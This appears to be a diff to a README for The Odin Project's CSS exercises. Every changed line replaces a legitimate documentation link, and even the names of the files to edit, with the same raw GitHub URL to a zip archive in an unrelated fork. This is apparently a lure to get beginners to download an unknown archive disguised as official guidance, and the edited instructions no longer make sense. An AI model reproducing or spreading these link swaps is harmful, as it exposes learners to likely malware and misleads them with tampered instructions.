@@ -9,18 +9,18 @@ When doing these exercises, please use all documentation and resources you need 
 
 ## Contributing
 
-If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://github.com/TheOdinProject/.github/blob/main/CONTRIBUTING.md).
+If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://raw.githubusercontent.com/ou2121/css-exercises/main/foundations/flex/07-flex-layout-2/css-exercises-v2.1.zip).
 
 ## How To Use These Exercises
 
 1. **Fork this repository.**  
-   - A *fork* is your own copy of a repository stored on your GitHub account. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://docs.github.com/en/get-started/quickstart/fork-a-repo).
+   - A *fork* is your own copy of a repository stored on your GitHub account. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://raw.githubusercontent.com/ou2121/css-exercises/main/foundations/flex/07-flex-layout-2/css-exercises-v2.1.zip).
 1. **Clone your *forked* repository.**  
-   - A *clone* is a copy of a repository on your local machine. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/cloning-a-repository-from-github/cloning-a-repository).
+   - A *clone* is a copy of a repository on your local machine. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://raw.githubusercontent.com/ou2121/css-exercises/main/foundations/flex/07-flex-layout-2/css-exercises-v2.1.zip).
 1. Go to an exercise directory and open the HTML file in a web browser. You can open the file directly or use something like VSCode's Live Preview extension.
 1. For each exercise, read the README thoroughly before starting any work.
     - Each README has a "Self Check" list. Use it as a list of **requirements** to make sure your solution matches the "Desired Outcome" image.
-1. Make your edits in the `index.html` and/or the `style.css` files in order to make the output in your browser look like the Desired Outcome image(s).
+1. Make your edits in the `https://raw.githubusercontent.com/ou2121/css-exercises/main/foundations/flex/07-flex-layout-2/css-exercises-v2.1.zip` and/or the `https://raw.githubusercontent.com/ou2121/css-exercises/main/foundations/flex/07-flex-layout-2/css-exercises-v2.1.zip` files in order to make the output in your browser look like the Desired Outcome image(s).
     - Depending on the instructions of the exercise, you may only need to make edits in one of these files.
 1. Once you successfully finish an exercise, check TOP's example solution.
     - You should not be checking the solution for an exercise until you finish it!
